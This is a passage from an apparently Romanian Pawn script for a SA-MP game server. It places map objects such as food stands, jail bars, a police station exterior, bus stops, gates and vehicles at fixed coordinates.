	CreateDynamicObject(2694,267.545,-173.620,1070.866,0.000,0.000,321.829);
	CreateDynamicObject(2040,263.582,-176.202,1070.307,0.000,0.000,333.904);
	CreateDynamicObject(2042,262.391,-176.087,1070.392,0.000,0.000,53.495);
	CreateDynamicObject(2465,262.761,-176.537,1071.993,0.000,0.000,177.935);
	CreateDynamicObject(3632,264.215,-176.158,1069.991,0.000,0.000,0.000);
	CreateDynamicObject(2253,259.679,-169.667,1071.374,0.000,0.000,0.000);
	CreateDynamicObject(2479,259.758,-170.795,1070.335,0.000,0.000,275.144);
	CreateDynamicObject(1617,272.078,-175.842,1073.551,0.000,0.000,360.000);
	CreateDynamicObject(914,260.113,-176.674,1073.227,0.000,0.000,0.000);
	CreateDynamicObject(927,259.965,-166.294,1072.927,0.000,0.000,0.000);
	CreateDynamicObject(1428,267.431,-168.792,1070.301,0.000,0.000,268.722);
	CreateDynamicObject(1208,259.776,-176.294,1069.477,0.000,0.000,0.000);
	CreateDynamicObject(2813,259.744,-171.195,1070.686,0.000,0.000,296.108);
	CreateDynamicObject(2630,267.459,-170.095,1069.429,0.000,0.000,0.000);
	CreateDynamicObject(2384,259.778,-169.684,1070.732,0.000,0.000,0.000);
	CreateDynamicObject(2484,259.696,-170.912,1071.902,0.000,0.000,272.826);
	CreateDynamicObject(2478,267.610,-171.947,1069.693,0.000,0.000,268.403);
	CreateDynamicObject(2478,267.884,-172.952,1069.462,0.000,0.000,177.562);
	CreateDynamicObject(18644,263.407,-175.912,1070.343,0.000,90.000,308.606);
	CreateDynamicObject(18635,264.135,-176.059,1070.454,90.000,90.000,295.189);
	CreateDynamicObject(18633,262.790,-176.453,1070.335,0.000,90.000,272.563);
	CreateDynamicObject(18645,267.423,-172.973,1069.837,0.000,-22.000,213.032);
	CreateDynamicObject(18632,267.770,-172.251,1069.989,90.000,180.000,196.032);
	CreateDynamicObject(19087,269.392,-169.921,1075.683,0.000,0.000,0.000);
	CreateDynamicObject(19555,270.575,-176.520,1071.385,70.000,90.000,0.000);
	CreateDynamicObject(19556,270.831,-176.486,1071.385,90.000,90.000,50.000);
	CreateDynamicObject(19621,270.349,-176.464,1071.441,0.000,0.000,286.217);
	CreateDynamicObject(19627,262.996,-175.929,1070.323,0.000,0.000,49.958);
	CreateDynamicObject(19626,259.396,-174.793,1070.267,-10.000,0.000,90.000);
	CreateDynamicObject(19815,263.062,-176.660,1070.869,0.000,0.000,180.000);
	CreateDynamicObject(19835,271.110,-172.901,1070.656,0.000,0.000,0.000);
	CreateDynamicObject(19896,271.392,-172.369,1070.611,0.000,0.000,0.000);
	CreateDynamicObject(17969,267.983,-176.617,1072.801,0.000,0.000,-90.000);
	CreateDynamicObject(4227,272.010,-175.921,1071.482,0.000,0.000,270.000);
	CreateDynamicObject(1085,267.36075, -166.97379, 1069.90002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1085,267.37299, -166.39149, 1069.90002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1085, 267.35925, -167.25391, 1069.90002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1085, 267.33682, -166.68761, 1069.90002,   0.00000, 0.00000, 90.00000);
	// --------------------------------- STAND CU MANCARE -------------------------------
	CreateDynamicObject(1571, 1947.00854, -1940.88342, 13.62530,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(3089, 1945.03088, -1941.83691, 13.42693,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2542, 1948.10632, -1941.97473, 12.50970,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2543, 1946.92249, -1942.10938, 12.30719,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2541, 1945.77478, -1941.96204, 12.50960,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1571, 1577.94043, -1743.71497, 13.56608,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(3089, 1577.57593, -1745.67175, 13.35764,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2543, 1579.06396, -1742.67688, 12.35080,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2541, 1579.07361, -1743.69336, 12.55170,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2542, 1579.07996, -1744.86023, 12.55170,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1571, 1182.34827, -1412.56018, 13.57220,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(3089, 1180.39294, -1413.62024, 13.27451,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2542, 1183.40967, -1413.59998, 12.47730,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2543, 1182.32275, -1413.69165, 12.37770,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2541, 1181.20337, -1413.58142, 12.43560,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1571, 1376.93372, -1045.06177, 26.74469,   0.00000, 0.00000, 208.40207);
	CreateDynamicObject(3089, 1375.71997, -1046.90796, 26.50977,   0.00000, 0.00000, 118.82825);
	CreateDynamicObject(2542, 1378.42029, -1045.54846, 25.62910,   0.00000, 0.00000, 208.40210);
	CreateDynamicObject(2543, 1377.34595, -1045.95947, 25.49599,   0.00000, 0.00000, 208.40210);
	CreateDynamicObject(2541, 1376.28296, -1046.34705, 25.62506,   0.00000, 0.00000, 208.40210);
	CreateDynamicObject(1571, 1181.08545, -958.88538, 42.96781,   0.00000, 0.00000, 186.28963);
	CreateDynamicObject(3089, 1179.25757, -960.16827, 42.70214,   0.00000, 0.00000, 96.67690);
	CreateDynamicObject(2542, 1182.19250, -959.82031, 41.84540,   0.00000, 0.00000, 186.28960);
	CreateDynamicObject(2543, 1181.10815, -960.03534, 41.70461,   0.00000, 0.00000, 186.28960);
	CreateDynamicObject(2541, 1179.97388, -959.99554, 41.85310,   0.00000, 0.00000, 186.28960);
	CreateDynamicObject(1571, 1832.27869, -1884.31702, 13.45911,   0.00000, 0.00000, 269.25009);
	CreateDynamicObject(3089, 1831.93274, -1886.27148, 13.13080,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2542, 1833.34656, -1883.29810, 12.44430,   0.00000, 0.00000, 269.25009);
	CreateDynamicObject(2543, 1833.43616, -1884.51282, 12.24310,   0.00000, 0.00000, 269.25009);
	CreateDynamicObject(2541, 1833.40784, -1885.64526, 12.34820,   0.00000, 0.00000, 269.25009);
	CreateDynamicObject(2494, 1948.33032, -1939.80298, 14.11059,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2582, 1945.94226, -1939.58704, 12.62940,   0.00000, 0.00000, 181.16080);
	CreateDynamicObject(2582, 1947.66699, -1939.57483, 12.62940,   0.00000, 0.00000, 181.16080);
	CreateDynamicObject(2452, 1949.74414, -1940.29358, 12.47800,   0.00000, 0.00000, 179.17140);
	CreateDynamicObject(2452, 1831.70532, -1881.57837, 12.27299,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2582, 1830.97961, -1885.21509, 12.45320,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2582, 1830.98352, -1883.65515, 12.45320,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2507, 1831.09106, -1883.00586, 14.06739,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2452, 1577.25439, -1740.94421, 12.44129,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2361, 1579.16553, -1746.94373, 12.54470,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2582, 1576.62500, -1744.67712, 12.56560,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2582, 1576.63611, -1742.91199, 12.56560,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2507, 1576.76880, -1742.43835, 14.19632,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2361, 1179.17529, -1413.75134, 12.42508,   0.00000, 0.00000, 0.00000);
	
    //gratii pd
    new gratie1, gratie2, gratie3, gratie4, gratie5, gratie6;
	gratie1 = CreateObject(19302, 266.32431, 85.70610, 1001.28571,   0.00000, 0.00000, 90.30000);
	gratie2 = CreateObject(19302, 266.31870, 87.46790, 1001.28571,   0.02000, 0.00000, -89.82000);
	gratie3 = CreateObject(19302, 266.32031, 82.94890, 1001.28571,   0.02000, 0.00000, -89.82000);
	gratie4 = CreateObject(19302, 266.33569, 81.20160, 1001.28571,   0.02000, 0.00000, 90.36000);
	gratie5 = CreateObject(19302, 266.29480, 76.71580, 1001.28571,   0.02000, 0.00000, 90.36000);
	gratie6 = CreateObject(19302, 266.29480, 78.45580, 1001.28571,   0.02000, 0.00000, -90.60000);
	SetObjectMaterial(gratie1, 0, 19302, "gratie1", "gratie1", 0xFFFFFFFF);
	SetObjectMaterial(gratie2, 0, 19302, "gratie2", "gratie2", 0xFFFFFFFF);
	SetObjectMaterial(gratie3, 0, 19302, "gratie3", "gratie3", 0xFFFFFFFF);
	SetObjectMaterial(gratie4, 0, 19302, "gratie4", "gratie4", 0xFFFFFFFF);
	SetObjectMaterial(gratie5, 0, 19302, "gratie5", "gratie5", 0xFFFFFFFF);
	SetObjectMaterial(gratie6, 0, 19302, "gratie6", "gratie6", 0xFFFFFFFF);

	//gratii ajail
	new gratia1, gratia2, gratia3, gratia4, gratia5, gratia6, gratia7, gratia8;
	gratia1 = CreateObject(19302, 228.28619, 112.66590, 999.23529,   0.00000, 0.00000, 180.48010);
	gratia2 = CreateObject(19302, 226.50360, 112.64810, 999.23529,   0.00000, 0.00000, 0.90020);
	gratia3 = CreateObject(19302, 222.62360, 112.64810, 999.23529,   0.00000, 0.00000, 359.64001);
	gratia4 = CreateObject(19302, 224.36360, 112.64810, 999.23529,   0.00000, 0.00000, 538.79919);
	gratia5 = CreateObject(19302, 220.38361, 112.64810, 999.23529,   0.00000, 0.00000, 539.69940);
	gratia6 = CreateObject(19302, 218.66360, 112.64810, 999.23529,   0.00000, 0.00000, 359.33963);
	gratia7 = CreateObject(19302, 216.44360, 112.64810, 999.23529,   0.00000, 0.00000, 538.73865);
	gratia8 = CreateObject(19302, 214.72360, 112.64810, 999.23529,   0.00000, 0.00000, 359.45889);
	SetObjectMaterial(gratia1, 0, 19302, "gratia1", "gratia1", 0xFFFFFFFF);
	SetObjectMaterial(gratia2, 0, 19302, "gratia2", "gratia2", 0xFFFFFFFF);
	SetObjectMaterial(gratia3, 0, 19302, "gratia3", "gratia3", 0xFFFFFFFF);
	SetObjectMaterial(gratia4, 0, 19302, "gratia4", "gratia4", 0xFFFFFFFF);
	SetObjectMaterial(gratia5, 0, 19302, "gratia5", "gratia5", 0xFFFFFFFF);
	SetObjectMaterial(gratia6, 0, 19302, "gratia6", "gratia6", 0xFFFFFFFF);
	SetObjectMaterial(gratia7, 0, 19302, "gratia7", "gratia7", 0xFFFFFFFF);
	SetObjectMaterial(gratia8, 0, 19302, "gratia8", "gratia8", 0xFFFFFFFF);

	//Hq FBI
    CreateDynamicObject(19377, 666.93982, -557.02802, 15.13310,   0.00000, 91.00000, 0.00000);
	CreateDynamicObject(19377, 666.94043, -566.58160, 15.19310,   0.00000, 91.00000, 0.00000);
	CreateDynamicObject(19377, 666.94293, -572.95233, 15.17310,   0.00000, 91.00000, 0.00000);
	CreateDynamicObject(11326, 668.95013, -573.81860, 17.74650,   0.00000, 0.00000, 90.18000);
	CreateDynamicObject(9623, 701.65344, -562.83527, 18.03950,   0.00000, 0.00000, 89.81999);
	CreateDynamicObject(19377, 696.48126, -585.44824, 15.14340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(19377, 696.35419, -575.87994, 15.14340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(19377, 695.51837, -566.07990, 15.14340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(19377, 694.07977, -566.14966, 15.14340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(19377, 696.21149, -556.47168, 15.14340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(19377, 696.22986, -547.10999, 15.14340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(19377, 696.77716, -540.30585, 15.14340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(19377, 707.81512, -540.46393, 14.98340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(19377, 706.99896, -550.04419, 15.00340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(19377, 707.70587, -559.03546, 15.00340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(19377, 704.81384, -566.50623, 15.00340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(19377, 706.92303, -577.68646, 15.00340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(19377, 706.95959, -587.18536, 15.00340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(19377, 707.95074, -566.54077, 15.00340,   0.00000, 91.00000, 11.46000);
	CreateDynamicObject(19377, 701.13971, -549.74371, 15.00340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(19377, 707.91034, -568.86755, 15.00340,   0.00000, 91.00000, 11.46000);
	CreateDynamicObject(1676, 695.69348, -563.09631, 17.08250,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1676, 695.69348, -563.09631, 17.08250,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1676, 695.70410, -571.70740, 17.08250,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1676, 695.67365, -553.88867, 17.08250,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1676, 707.57294, -554.17126, 17.08250,   0.00000, 0.00000, -2.70000);
	CreateDynamicObject(19377, 706.24176, -559.54761, 15.00340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(1676, 707.51013, -563.34412, 17.08250,   0.00000, 0.00000, -2.70000);
	CreateDynamicObject(1676, 707.54889, -572.00061, 17.08250,   0.00000, 0.00000, -1.20000);
	CreateDynamicObject(19377, 706.94525, -540.55505, 14.98340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(19377, 710.90552, -548.85083, 14.90340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(19377, 709.98456, -559.23059, 14.90340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(19377, 716.18982, -577.36462, 14.78340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(19377, 716.82098, -586.93445, 14.78340,   0.00000, 91.00000, -1.20000);
	CreateDynamicObject(1980, 617.92468, -602.69360, 17.91540,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1980, 617.86615, -609.80939, 17.91540,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1980, 617.93164, -597.28455, 17.91540,   0.00000, 0.00000, 0.00000);
	//gard cnn
    CreateDynamicObject(970, 1113.81226, -1415.95642, 12.99760,   0.00000, 0.00000, 1.02000);
	CreateDynamicObject(970, 1118.95190, -1415.88806, 12.99760,   0.00000, 0.00000, 0.24000);
	CreateDynamicObject(970, 1123.87134, -1415.89172, 13.01760,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1128.84937, -1415.87390, 13.05760,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1133.62927, -1415.89539, 13.05760,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1138.54712, -1415.90955, 13.07760,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1143.48718, -1415.95984, 13.07760,   0.00000, 0.00000, -0.54000);
	CreateDynamicObject(970, 1186.10474, -1495.67102, 12.96110,   0.00000, 0.00000, -90.06000);
	CreateDynamicObject(970, 1186.14282, -1490.92114, 12.96110,   0.00000, 0.00000, -90.06000);
	CreateDynamicObject(970, 1186.13611, -1486.25720, 12.96110,   0.00000, 0.00000, -90.06000);
	CreateDynamicObject(970, 1186.10059, -1481.48560, 12.96110,   0.00000, 0.00000, -90.06000);
	CreateDynamicObject(970, 1124.00598, -1562.16187, 12.95910,   0.00000, 0.00000, -0.48000);
	CreateDynamicObject(970, 1133.22400, -1562.16504, 12.95910,   0.00000, 0.00000, 0.12000);
	CreateDynamicObject(970, 1128.58142, -1562.17664, 12.95910,   0.00000, 0.00000, -0.48000);
	CreateDynamicObject(970, 1061.49329, -1492.59277, 12.96960,   0.00000, 0.00000, -105.78001);
	CreateDynamicObject(970, 1059.12000, -1501.51147, 12.96960,   0.00000, 0.00000, -104.70000);
	CreateDynamicObject(970, 1060.26794, -1497.01086, 12.98960,   0.00000, 0.00000, -105.30000);

	//LINII MASINI
    CreateDynamicObject(10183, 1267.64600, -1797.14282, 12.43480,   0.00000, 0.00000, 44.64000);
	CreateDynamicObject(10183, 1205.08972, -1829.13245, 12.43480,   0.00000, 0.00000, 45.48000);
	CreateDynamicObject(10183, 1570.63953, -1606.69458, 12.40590,   0.00000, 0.00000, 45.12000);


	//PD Exterior by LeOn
	CreateDynamicObject(11326, 1605.05212, -1623.62476, 14.96770,   0.00000, 0.00000, 89.46000);
	CreateDynamicObject(955, 1553.64233, -1683.42175, 12.92650,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(983, 1542.62939, -1641.17981, 27.70590,   0.00000, 0.00000, -180.48010);
	CreateDynamicObject(983, 1545.80750, -1650.77563, 27.68590,   0.00000, 0.00000, -270.12021);
	CreateDynamicObject(983, 1542.60828, -1647.55884, 27.70590,   -0.16000, -0.04000, -180.12010);
	CreateDynamicObject(983, 1550.38745, -1650.77563, 27.68590,   0.00000, 0.00000, -270.12021);
	CreateDynamicObject(983, 1542.62939, -1640.45984, 27.70590,   0.00000, 0.00000, -180.48010);
	CreateDynamicObject(983, 1545.85986, -1637.26941, 27.70590,   0.00000, 0.00000, -270.18002);
	CreateDynamicObject(983, 1552.21460, -1637.27222, 27.70590,   0.00000, 0.00000, -270.18002);
	CreateDynamicObject(983, 1558.61877, -1637.28772, 27.70590,   0.00000, 0.00000, -270.18002);
	CreateDynamicObject(983, 1565.02625, -1637.32434, 27.70590,   0.00000, 0.00000, -270.18002);
	CreateDynamicObject(983, 1571.40149, -1637.35168, 27.70590,   0.00000, 0.00000, -270.18002);
	CreateDynamicObject(983, 1574.66931, -1637.35522, 27.70590,   0.00000, 0.00000, -270.17999);
	CreateDynamicObject(983, 1577.83557, -1640.57202, 27.70590,   0.00000, 0.00000, -180.48010);
	CreateDynamicObject(983, 1577.77295, -1646.93713, 27.70590,   0.00000, 0.00000, -180.48010);
	CreateDynamicObject(983, 1577.78162, -1653.32056, 27.70590,   0.00000, 0.00000, -180.06012);
	CreateDynamicObject(983, 1577.78674, -1659.73962, 27.70590,   0.00000, 0.00000, -180.06012);
	CreateDynamicObject(983, 1577.77917, -1666.16150, 27.70590,   0.00000, 0.00000, -180.06012);
	CreateDynamicObject(983, 1577.75732, -1672.53748, 27.70590,   0.00000, 0.00000, -180.06012);
	CreateDynamicObject(983, 1577.72766, -1678.91931, 27.70590,   0.00000, 0.00000, -180.06012);
	CreateDynamicObject(983, 1577.73621, -1685.32568, 27.70590,   0.00000, 0.00000, -180.06012);
	CreateDynamicObject(983, 1577.72400, -1691.71228, 27.70590,   0.00000, 0.00000, -180.06012);
	CreateDynamicObject(983, 1577.71289, -1698.10791, 27.70590,   0.00000, 0.00000, -180.06012);
	CreateDynamicObject(983, 1577.72131, -1704.51245, 27.70590,   0.00000, 0.00000, -180.06012);
	CreateDynamicObject(983, 1577.69897, -1710.88159, 27.70590,   0.00000, 0.00000, -180.06012);
	CreateDynamicObject(983, 1577.69897, -1711.24158, 27.70590,   0.00000, 0.00000, -180.06010);
	CreateDynamicObject(983, 1574.44556, -1714.38306, 27.70590,   0.00000, 0.00000, -270.35995);
	CreateDynamicObject(983, 1568.07471, -1714.34656, 27.70590,   0.00000, 0.00000, -270.35995);
	CreateDynamicObject(983, 1561.66760, -1714.30737, 27.70590,   0.00000, 0.00000, -270.35995);
	CreateDynamicObject(983, 1555.31116, -1714.26440, 27.70590,   0.00000, 0.00000, -270.35995);
	CreateDynamicObject(983, 1548.95508, -1714.22168, 27.70590,   0.00000, 0.00000, -270.35995);
	CreateDynamicObject(983, 1545.76025, -1714.20190, 27.70590,   0.00000, 0.00000, -270.35995);
	CreateDynamicObject(983, 1542.57971, -1710.99304, 27.70590,   0.00000, 0.00000, -359.87982);
	CreateDynamicObject(983, 1542.54773, -1704.60864, 27.70590,   0.00000, 0.00000, -359.87982);
	CreateDynamicObject(983, 1542.54773, -1703.70862, 27.70590,   0.00000, 0.00000, -359.87979);
	CreateDynamicObject(983, 1545.74390, -1700.54211, 27.70590,   0.00000, 0.00000, -270.00009);
	CreateDynamicObject(983, 1550.38757, -1700.53650, 27.70590,   0.00000, 0.00000, -270.00009);
	CreateDynamicObject(983, 1553.58850, -1697.36475, 27.70590,   0.00000, 0.00000, -179.70013);
	CreateDynamicObject(983, 1553.56555, -1690.94910, 27.70590,   0.00000, 0.00000, -179.70013);
	CreateDynamicObject(983, 1553.56580, -1656.84106, 27.70590,   0.00000, 0.00000, -179.70010);
	CreateDynamicObject(983, 1553.55737, -1653.96729, 27.70590,   0.00000, 0.00000, -179.70010);
	CreateDynamicObject(3934, 1562.89099, -1700.73755, 27.38710,   0.00000, -0.02000, -0.84000);
	CreateDynamicObject(3934, 1560.78516, -1650.95300, 27.38710,   0.00000, -0.02000, 1.02000);

	//Statii autobuz
	CreateDynamicObject(1257, 1692.89929, -2200.77808, 13.64870,   0.00000, 0.00000, -90.12000);
	CreateDynamicObject(1257, 1941.19080, -2172.63159, 13.76920,   0.00000, 0.00000, -90.36000);
	CreateDynamicObject(1257, 1967.80859, -1900.26184, 13.77870,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1257, 1921.87402, -1746.02295, 13.76840,   0.00000, 0.00000, 90.06000);
	CreateDynamicObject(1257, 1815.46008, -1815.05981, 13.80990,   0.00000, 0.00000, -179.63989);
	CreateDynamicObject(1257, 1695.64038, -1766.75049, 13.78830,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1257, 1392.64221, -1726.04602, 13.65910,   0.00000, 0.00000, 89.46000);
	CreateDynamicObject(1257, 1318.69714, -1633.10010, 13.76780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1257, 1325.55969, -1389.08057, 13.76010,   0.00000, 0.00000, 90.24000);
	CreateDynamicObject(1257, 1212.34741, -1326.52954, 13.68430,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1257, 1083.02100, -1274.54492, 13.60720,   0.00000, 0.00000, 90.24000);
	CreateDynamicObject(1257, 964.63733, -1214.54919, 17.02340,   0.00000, 0.00000, 89.58000);
	CreateDynamicObject(1257, 818.55078, -1134.44849, 23.90680,   0.00000, 0.00000, 88.50000);
	CreateDynamicObject(1257, 791.28119, -1301.22681, 13.56870,   0.00000, 0.00000, -179.51990);
	CreateDynamicObject(1257, 679.34332, -1388.95630, 13.72830,   0.00000, 0.00000, 90.12000);
	CreateDynamicObject(1257, 378.06552, -1489.50562, 32.17630,   0.00000, 0.00000, 128.28003);
	CreateDynamicObject(1257, 261.02219, -1539.33704, 32.41950,   0.00000, 0.00000, -34.38000);
	CreateDynamicObject(1257, 485.92880, -1361.02576, 18.19000,   -4.00000, 4.00000, -65.24000);
	CreateDynamicObject(1257, 589.19830, -1236.84290, 17.97730,   0.00000, 0.00000, -67.92000);
	CreateDynamicObject(1257, 775.53870, -1062.00525, 24.75130,   0.00000, 0.00000, -77.69999);
	CreateDynamicObject(1257, 1209.70325, -952.07233, 43.01140,   0.00000, 0.00000, -79.26000);
	CreateDynamicObject(1257, 1713.93640, -736.80762, 50.49150,   -2.94000, 0.00000, -2.00000);
	CreateDynamicObject(1257, 1775.73401, 579.77661, 23.77970,   0.00000, 0.00000, -11.76000);
	CreateDynamicObject(1257, 1839.89514, 825.05157, 10.16840,   0.06000, 0.00000, 270.66010);
	CreateDynamicObject(1257, 2184.53564, 801.95203, 7.33030,   0.00000, 0.00000, -125.22000);
	CreateDynamicObject(1257, 2293.69141, 841.77661, 14.11820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1257, 2353.69604, 1025.47546, 10.84100,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1257, 2570.79736, 1066.87720, 10.84120,   0.00000, 0.00000, -90.24001);
	CreateDynamicObject(1257, 2613.71777, 1319.62097, 10.86020,   0.00000, 0.00000, 90.36000);
	CreateDynamicObject(1257, 2476.20508, 1479.59375, 10.86030,   0.00000, 0.00000, 89.94000);
	CreateDynamicObject(1257, 2401.10645, 1619.55835, 10.89970,   0.00000, 0.00000, 89.88000);
	CreateDynamicObject(1257, 2293.08325, 1779.52710, 10.80020,   0.00000, 0.00000, 89.70000);
	CreateDynamicObject(1257, 2158.93481, 1995.43042, 10.87960,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1257, 2231.25317, 2383.93506, 10.86030,   0.00000, 0.00000, -12.60000);
	CreateDynamicObject(1257, 2085.77344, 2459.35864, 10.88090,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1257, 1948.35791, 2399.46997, 10.92060,   0.00000, 0.00000, 89.64000);
	CreateDynamicObject(1257, 1920.80237, 2315.90601, 10.88100,   0.00000, 0.00000, -179.69991);
	CreateDynamicObject(1257, 1921.41638, 2117.40479, 10.94120,   0.00000, 0.00000, -179.70000);
	CreateDynamicObject(1257, 2093.48389, 2015.85571, 10.90140,   0.00000, 0.00000, -90.18000);
	CreateDynamicObject(1257, 2035.99133, 1521.35413, 10.90060,   0.00000, 0.00000, -180.05991);
	CreateDynamicObject(1257, 2036.35254, 1168.23950, 10.82070,   0.00000, 0.00000, -179.75990);
	CreateDynamicObject(1257, 2034.95715, 878.28998, 7.36150,   0.00000, 0.00000, -179.40010);
	CreateDynamicObject(1257, 1752.35156, 621.24127, 21.25890,   4.00000, 0.00000, 165.00000);
	CreateDynamicObject(1257, 1614.87988, 186.35570, 33.65740,   4.00000, 0.00000, -192.00000);
	CreateDynamicObject(1257, 1657.21387, -331.40521, 40.28030,   0.00000, 0.00000, -174.59990);
	CreateDynamicObject(1257, 1684.78406, -727.13708, 49.88370,   4.00000, 0.00000, -190.80000);
	CreateDynamicObject(1257, 1412.48633, -934.33838, 35.80170,   0.00000, 0.00000, 80.46000);
	CreateDynamicObject(1257, 1431.33862, -1040.25464, 23.92800,   0.00000, 0.00000, -89.94000);
	CreateDynamicObject(1257, 1571.46692, -1139.13977, 23.71380,   0.00000, 0.00000, -180.60001);
	CreateDynamicObject(1257, 1708.46350, -1263.24890, 13.60880,   0.00000, 0.00000, -179.16000);
	CreateDynamicObject(1257, 1590.66150, -1434.45093, 13.52840,   0.00000, 0.00000, 90.06000);
	CreateDynamicObject(1257, 1423.55896, -1568.12500, 13.62870,   0.00000, 0.00000, 173.27989);
	CreateDynamicObject(1257, 1446.39136, -1738.46875, 13.68900,   0.00000, 0.00000, -89.58000);
	CreateDynamicObject(1257, 1579.74524, -1878.48059, 13.62880,   0.00000, 0.00000, -90.06000);
	CreateDynamicObject(1257, 1815.37183, -1904.30969, 13.65310,   0.00000, 0.00000, -180.65990);
	CreateDynamicObject(1257, 1955.44678, -1998.47595, 13.60910,   0.00000, 0.00000, -179.52000);
	CreateDynamicObject(1257, 1935.31299, -2160.26001, 13.66810,   0.00000, 0.00000, 89.82000);

	//Pompe de benzina
	CreateDynamicObject(1676, 1009.18927, -936.09637, 42.78190,   0.00000, 0.00000, 6.66000);
	CreateDynamicObject(1676, 1005.57520, -936.67499, 42.78190,   0.00000, 0.00000, 6.66000);
	CreateDynamicObject(1676, 1002.23541, -937.06488, 42.78190,   0.00000, 0.00000, 6.66000);
	CreateDynamicObject(1676, 998.64508, -937.57654, 42.78190,   0.00000, 0.00000, 6.66000);

	//Masinute/Elicoptere/Tancuri PD, Aeroport si Dealership
	CreateVehicle(464, 1972.3630, -2177.0972, 16.6885, 51.6000, -1, -1, 100);
	CreateVehicle(465, 1950.9691, -2177.2039, 16.8155, -56.9400, -1, -1, 100);
	CreateVehicle(441, 326.6814, -1538.6517, 32.1894, -133.6799, -1, -1, 100);
	CreateVehicle(441, 330.8876, -1533.0819, 32.1894, -133.7999, -1, -1, 100);
	CreateVehicle(564, 1546.9607, -1672.4099, 14.0163, 89.9999, -1, -1, 100);
	CreateVehicle(564, 1547.0096, -1678.7792, 14.0163, 89.9999, -1, -1, 100);
	
	// GUNSHOS TONOMAT
	CreateDynamicObject(1977, 317.1961, -132.4190, 1002.9836,  356.9584, 0.1400, -90.5708,-1,-1,-1,300.0);

	// bug house
	CreateDynamicObject(19303, 442.47998, 509.23032, 1001.63678,   0.00000, 0.00000, 90.00000,-1,-1,-1,300.0);
	CreateDynamicObject(19304, 453.06204, 507.98209, 1001.92603,   0.00000, 0.00000, 90.00000,-1,-1,-1,300.0);
	CreateDynamicObject(19304, 453.11362, 509.63824, 1001.92603,   0.00000, 0.00000, 90.00000,-1,-1,-1,300.0);

	//NG BAZA
    gateng = CreateDynamicObject(19313, 135.2833, 1941.3331, 21.6932, 0.0000, 0.0000, 0.0000,-1,-1,-1,300.0);
    CreateDynamicObject(19312, 191.14, 1870.04, 21.48,0.0000, 0.0000, 0.0000,-1,-1,-1,300.0);

     // Hq Bug
    CreateDynamicObject(19357, 968.4691, -53.4128, 1001.8241, 0.0000, 0.0000, 0.0000,-1,-1,-1,300.0);

	//Lspd
	gatelspd = CreateObject(10184, 1592.67676, -1638.05225, 14.95110,   0.00000, 0.00000, -89.70000);

	//Lvpd
	gatelvpd = CreateDynamicObject(971, 2334.8999000, 2444.3999000, 8.3000000, 0.0000000, 0.0000000, 60.0000000,-1,-1,-1,300.0);
	gatelvpd2 = CreateDynamicObject(971, 2294.2000000, 2499.1001000, 5.7000000, 0.0000000, 0.0000000, 272.0000000,-1,-1,-1,300.0);
